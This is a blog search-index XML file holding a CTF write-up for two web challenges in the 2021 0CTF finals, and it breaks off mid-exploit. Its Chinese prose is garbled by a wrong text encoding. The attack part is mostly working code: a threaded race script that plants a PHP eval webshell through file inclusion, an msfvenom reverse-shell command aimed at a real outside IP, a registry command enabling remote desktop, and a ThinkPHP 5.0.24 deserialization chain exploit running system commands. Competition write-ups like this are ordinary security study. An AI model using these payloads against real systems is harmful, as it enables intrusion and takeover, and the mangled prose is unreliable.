<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021 0CTF FINAL wp</title>
      <link href="/2021/09/28/2021-0CTF-FINAL/"/>
      <url>/2021/09/28/2021-0CTF-FINAL/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‘¨æœ«æ˜¯TCTF/0CTFå†³èµ›ï¼Œè€Œæ°å¥½å‘¨å…­æ˜¯å·…å³°æå®¢å†³èµ›ï¼Œè¿™å‡ å¤©è¿˜è¢«æ‹‰å»æ‰“æ•™è‚²hwï¼Œæ‰“å®Œå·…å³°æå®¢åŸºæœ¬æ˜¯åŒå¼€çš„çŠ¶æ€ï¼Œæ‰“å®Œæ„Ÿè§‰äººä¹Ÿå¿«åºŸæ‰äº†ã€‚åªçœ‹äº†ä¸¤ä¸ªWebï¼ˆå…¶ä»–é¢˜åŸºæœ¬ä¹Ÿæ²¡å•¥åšå‡ºæ¥çš„å¯èƒ½ï¼‰ï¼Œæ•´ç†äº†ä¸‹é¢˜è§£ã€‚</p><a id="more"></a><h2 id="win-win"><a href="#win-win" class="headerlink" title="win-win"></a>win-win</h2><p>windows+php8 ç¯å¢ƒï¼Œä¸€è¡Œphpã€‚</p><p>ç¬¬ä¸€å¤©æ”¾äº†hintï¼Œ<code>session.upload_progress=off</code>ï¼Œçœ‹èµ·æ¥ä¸èƒ½ç”¨sessionä¸Šä¼ ã€‚</p><p>å¡äº†å¾ˆä¹…ï¼Œè¯»ä¸åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚è¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/bylfsj/article/details/102771173">https://blog.csdn.net/bylfsj/article/details/102771173</a>æåˆ°windowsä¸‹å¯ä»¥åˆ©ç”¨é€šé…ç¬¦è¿›è¡ŒåŒ…å«ã€‚çŒœæµ‹é¢˜ç›®ç”±phpstudyã€xamppç­‰æ­å»ºï¼Œæœ€ååŒ…å«xamppçš„ <code>apache_start.bat</code>æ–‡ä»¶æˆåŠŸï¼š<code>?win=..\..\t&lt;\apache_start.bat</code>ã€‚</p><p>è¯»å–php.iniæ–‡ä»¶ï¼š<code>?win=..\..\t&lt;\php\phpi.ini</code>ï¼Œå‘ç°äº†è·¯å¾„ï¼š<code>C:\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\</code></p><p>æ ¹æ®xamppé»˜è®¤é…ç½®ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ï¼š<code>C:\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\tmp\</code>ã€‚å°è¯•sessionä¸Šä¼ +åŒ…å«ï¼ŒæˆåŠŸï¼ˆè¿œç¨‹ç¯å¢ƒå¯èƒ½é…é”™äº†ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;http://c39294ecfe15141c45c17c301e267eba.winwin.pwnable.org/?win=..\..\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\\tmp\sess_abc&#x27;</span></span><br><span class="line">sess_name = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=&#x27;</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;@&lt;?php echo &quot;gmmml&quot;;system(&quot;dir c:\\\\&quot;);file_put_contents(&quot;gml.php&quot;,base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWyJnbWwiXSk7IGVjaG8gMTs/Pg==&quot;));?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span>(<span class="params">i</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;ZZ&#x27;</span> + payload + <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">&#x27;f&#x27;</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;gmmml&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            <span class="built_in">print</span> r.content</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner1, <span class="built_in">range</span>(<span class="number">100000</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p>getshellåï¼Œæ‰¾ä¸åˆ°flagã€‚</p><p>æœ¬åœ°ç”Ÿæˆmsfé©¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=202.112.51.236 lport=5555 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ç›‘å¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Use exploit/multi/handler</span><br><span class="line">Set payload windows/meterpreter/reverse_tcp</span><br><span class="line">Set lhost 0.0.0.0</span><br><span class="line">Set lport 5555</span><br><span class="line">Run</span><br></pre></td></tr></table></figure><p>getsystemææƒï¼Œåˆ©ç”¨mimikatzæŠ“å¯†ç ï¼Œç©ºçš„ã€‚<code>screenshot</code>æ²¡æœ‰æƒé™ã€‚æ‰“å¼€3389ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹administratorå¯†ç ï¼š</p><p><img src="/2021/09/28/2021-0CTF-FINAL/Untitled2.png" alt="Untitled2"></p><p>ç«¯å£è½¬å‘ï¼Œ3389è¿æ¥ï¼Œflagåœ¨æ¡Œé¢txtä¸Šæ²¡æœ‰ä¿å­˜ï¼š</p><p><img src="/2021/09/28/2021-0CTF-FINAL/Untitled3.png" alt="Untitled3"></p><h2 id="RevengePHP"><a href="#RevengePHP" class="headerlink" title="RevengePHP"></a>RevengePHP</h2><p>é¢˜ç›®è€ƒæŸ¥thinkphp5.0.24ååºåˆ—åŒ–ï¼ŒæŠŠç½‘ä¸Šç°æœ‰çš„é“¾å­ç»™å µäº†ï¼š</p><p><code>thinkphp/library/think/console/Output.php</code>ï¼š</p><p><img src="/2021/09/28/2021-0CTF-FINAL/image-20210928211446948.png" alt="image-20210928211446948"></p><p>å¹¶ä¸”ç°æœ‰çš„é“¾å­æ˜¯å‘webç›®å½•å†™shellï¼Œå¾ˆæ˜¾ç„¶è¿™ä¸ªé¢˜ç›®è¿˜é™åˆ¶äº†webç›®å½•ä¸å¯å†™ã€‚äº‹å®è¯æ˜åŒä¿é™©æ˜¯æ­£ç¡®çš„ï¼Œå› ä¸º__wakeupå¹¶æ²¡æœ‰å½±å“è¿™æ¡ååºåˆ—åŒ–é“¾ã€‚</p><p>å› ä¸ºä¹‹å‰ä¸€ç›´æ²¡æœ‰åˆ†æè¿‡tpçš„ååºåˆ—åŒ–é“¾å­ï¼Œæ­£å¥½å€Ÿç€è¿™ä¸ªé¢˜ä»é›¶å­¦ä¹ äº†ä¸€æ³¢ã€‚è¿™ä¸ªé¢˜ä»ç¬¬äºŒå¤©æ™šä¸Š11ç‚¹å¼€å§‹çœ‹ï¼Œå®¡è®¡åˆ°æ—©ä¸Š5ç‚¹ï¼Œå®åœ¨æ˜¯å›°å¾—ä¸è¡Œäº†ï¼Œè¿˜è¦èµ¶12ç‚¹çš„é£æœºï¼Œç›´æ¥ç¡äº†ã€‚èµ›åäº¤æµå‘ç°è¿™ä¸ªé¢˜è§£æ³•ä¸æ­¢ä¸€ç§ï¼ˆæœç„¶ï¼Œæ—¥ç©¿ä¸€ä¸ªä¸œè¥¿æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠŠä»–æ”¾åˆ°ä¸€åœºCTFé‡Œï¼‰</p><p>å‰é¢æåˆ°å‡ºé¢˜äººæ·»åŠ äº†<code>__wakeup</code>æ–¹æ³•æ¥é˜²æ­¢ååºåˆ—åŒ–ï¼Œå…¶å®<code>__wakeup</code>æ–¹æ³•å¯ä»¥ç»•è¿‡ï¼Œè¿™ä¸ªCTFä¸­éƒ½è¢«è€ƒçƒ‚äº†ã€‚ä½†æœ‰è¶£çš„æ˜¯ï¼Œå³ä½¿ä¸è¿›è¡Œç»•è¿‡ï¼Œäº‹å®ä¸ŠæŠ›å‡ºå¼‚å¸¸ä¹Ÿå¹¶ä¸èƒ½é˜»æ­¢ååºåˆ—åŒ–é“¾å­çš„å‘ä¸‹æ‰§è¡Œã€‚æˆ‘æŠŠæŠ›å‡ºå¼‚å¸¸æ›¿æ¢æˆdieä¹Ÿæ˜¯ä¸€æ ·çš„ç»“æœã€‚</p><p>ä¸ºäº†æ¢ç©¶åŸå› ï¼Œå¼€å¯è°ƒè¯•ï¼Œåœ¨<code>__wakeup</code>å¤„ä¸‹æ–­ç‚¹ï¼ŒæˆåŠŸæ–­ä¸‹æ¥ï¼š</p><p><img src="/2021/09/28/2021-0CTF-FINAL/image-20210928215907004.png" alt="image-20210928215907004"></p><p>å¯ä»¥å‘ç°åœ¨æ‰§è¡Œåˆ° __wakeup çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„å¯¹è±¡å·²ç»è¢«æˆåŠŸååºåˆ—åŒ–ï¼ˆçº¢æ¡†é‡Œæ‰€ç¤ºï¼‰ã€‚æ­¤æ—¶æˆ‘ä»¬ç‚¹å‡»è¿è¡Œä¸‹ä¸€æ­¥ï¼š</p><p><img src="/2021/09/28/2021-0CTF-FINAL/image-20210928220049890.png" alt="image-20210928220049890"></p><p>çœ‹åˆ°è¿™é‡Œæç„¶å¤§æ‚Ÿï¼šæŠ›å‡ºå¼‚å¸¸åç¨‹åºä¼šè¿›å…¥ç»ˆæ­¢çš„é€»è¾‘ï¼Œæ­¤æ—¶è‡ªç„¶ä¼šè¿›è¡Œå¯¹è±¡é”€æ¯æ“ä½œï¼Œè€Œå› ä¸ºå¯¹è±¡å·²ç»è¢«æˆåŠŸååºåˆ—åŒ–ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸ä¼šå½±å“ååºåˆ—åŒ–é“¾çš„æ‰§è¡Œã€‚</p><p>å›åˆ°è¿™ä¸ªé¢˜ç›®ï¼Œè™½ç„¶é“¾å­å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯webç›®å½•å·²ç»è®¾ç½®ä¸ºä¸å¯å†™ï¼Œæ‰€ä»¥åŒæ ·éœ€è¦å¦æ‰¾é“¾ã€‚</p><p>ç¬¬ä¸€æ¡RCEçš„é“¾å­åŒæ ·æ˜¯åˆ©ç”¨äº†<code>thinkphp/library/think/console/Output.php</code>ä¸­Outputç±»çš„blockæ–¹æ³•ï¼Œå¯ä»¥è¾¾åˆ°ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„æ•ˆæœï¼Œä¸‹é¢è·Ÿä¸€ä¸‹è¿™æ¡é“¾ã€‚å…³äºä¹‹å‰ç½‘ä¸Šå…¬å¼€çš„thinkphp5.0.24çš„åˆ©ç”¨é“¾ï¼Œè¿™é‡Œä¸è¿‡å¤šèµ˜è¿°ï¼Œä¸æ¸…æ¥šçš„å¯ä»¥å‚è€ƒ<a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">è¿™ç¯‡æ–‡ç« </a>å­¦ä¹ ä¸€ä¸‹ã€‚</p><p>åœ¨æ‰§è¡Œåˆ°<code>thinkphp/library/think/session/driver/Memcached.php</code>çš„writeæ–¹æ³•åï¼Œå·²æœ‰å†™shellçš„é“¾å­æ˜¯åˆ©ç”¨äº†<code>/thinkphp/library/think/cache/driver/File.php</code>çš„setæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨<code>thinkphp/library/think/cache/driver/Memcache.php</code> çš„setæ–¹æ³•ï¼š</p><p><img src="/2021/09/28/2021-0CTF-FINAL/image-20210928221340093.png" alt="image-20210928221340093"></p><p>è·Ÿè¿› has æ–¹æ³•ï¼Œè¿™é‡Œçš„ name å˜é‡æ˜¯æˆ‘ä»¬å¯æ§çš„å˜é‡å’Œ<code>&lt;getAttr&gt;xxx&lt;getAttr&gt;</code>æ‹¼æ¥çš„ç»“æœã€‚</p><p><img src="/2021/09/28/2021-0CTF-FINAL/image-20210928221511371.png" alt="image-20210928221511371"></p><p>getCachekeyæ–¹æ³•è¿”å›çš„ keyå¯æ§ï¼Œä¹‹åä¼šè°ƒç”¨ this-&gt;handler-&gt;get æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨<code>thinkphp/library/think/Request.php</code>çš„getæ–¹æ³•ã€‚å¦‚æœå¯¹ thinkphp5 rce æ¼æ´æœ‰åˆ†æè¿‡çš„äººå¯èƒ½ä¼šå¾ˆç†Ÿæ‚‰ï¼Œå› ä¸ºå°±æ˜¯åˆ©ç”¨è¿™ä¸ª Request ç±»è¿›è¡Œ rce çš„ã€‚åé¢ååºåˆ—åŒ– rce çš„æ€è·¯åŸºæœ¬ä¸€æ ·ã€‚</p><p>è°ƒç”¨ this-&gt;input æ–¹æ³•ï¼š</p><p><img src="/2021/09/28/2021-0CTF-FINAL/image-20210928221834604.png" alt="image-20210928221834604"></p><p>è¿›åˆ°inputæ–¹æ³•ï¼Œè°ƒç”¨ filterValue æ–¹æ³•ã€‚ï¼ˆfilterå˜é‡ç”±getFilteræ–¹æ³•è¿”å›å¾—åˆ°ï¼Œå¯æ§ã€‚dataå˜é‡ä¹Ÿæ˜¯ç”±å‰é¢inputç±»çš„ this-&gt;get è·å¾—åè¿›è¡Œä¸€äº›æ“ä½œï¼Œä¹Ÿå¯æ§ï¼‰</p><p><img src="/2021/09/28/2021-0CTF-FINAL/image-20210928221932807.png" alt="image-20210928221932807"></p><p>è¿›åˆ° filterValue æ–¹æ³•ï¼Œæ‰§è¡Œ call_user_funcï¼š</p><p><img src="/2021/09/28/2021-0CTF-FINAL/image-20210928222208656.png" alt="image-20210928222208656"></p><p>å®Œæˆ RCEã€‚æ•´ä¸ªè°ƒç”¨æ ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Request.php:1094, think\Request-&gt;filterValue()</span><br><span class="line">Request.php:1040, think\Request-&gt;input()</span><br><span class="line">Request.php:706, think\Request-&gt;get()</span><br><span class="line">Memcache.php:66, think\cache\driver\Memcache-&gt;has()</span><br><span class="line">Memcache.php:98, think\cache\driver\Memcache-&gt;set()</span><br><span class="line">Memcached.php:102, think\session\driver\Memcached-&gt;write()</span><br><span class="line">Output.php:154, think\console\Output-&gt;write()</span><br><span class="line">Output.php:143, think\console\Output-&gt;writeln()</span><br><span class="line">Output.php:124, think\console\Output-&gt;block()</span><br><span class="line">Output.php:212, call_user_func_array:&#123;thinkphp&#x2F;library&#x2F;think&#x2F;console&#x2F;Output.php:212&#125;()</span><br><span class="line">Output.php:212, think\console\Output-&gt;__call()</span><br><span class="line">Model.php:912, think\console\Output-&gt;getAttr()</span><br><span class="line">Model.php:912, think\model\Pivot-&gt;toArray()</span><br><span class="line">Model.php:936, think\model\Pivot-&gt;toJson()</span><br><span class="line">Model.php:2267, think\model\Pivot-&gt;__toString()</span><br><span class="line">Windows.php:163, file_exists()</span><br><span class="line">Windows.php:163, think\process\pipes\Windows-&gt;removeFiles()</span><br><span class="line">Windows.php:59, think\process\pipes\Windows-&gt;__destruct()</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$files</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [$files]; <span class="comment">//$file =&gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±»</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> $error = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$output, $modelRelation</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $output;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span> =&gt; <span class="string">&quot;getError&quot;</span>);     <span class="comment">//è°ƒç”¨getError è¿”å›this-&gt;error</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = $modelRelation;               <span class="comment">// $this-&gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $get = [<span class="string">&#x27;gml&#x27;</span> =&gt; <span class="string">&#x27;whoami&#x27;</span>]; </span><br><span class="line">        <span class="keyword">protected</span> $filter = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$output, $modelRelation</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">parent</span>::__construct($output, $modelRelation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindAttr = [];</span><br><span class="line">        <span class="keyword">protected</span> $query;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$query</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = $query;    <span class="comment">//$queryæŒ‡å‘Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$model</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = $model; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $handle;</span><br><span class="line">        <span class="keyword">protected</span> $styles;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached(); <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">Memcache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $handler;</span><br><span class="line">        <span class="keyword">protected</span> $config = [</span><br><span class="line">            <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;//&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        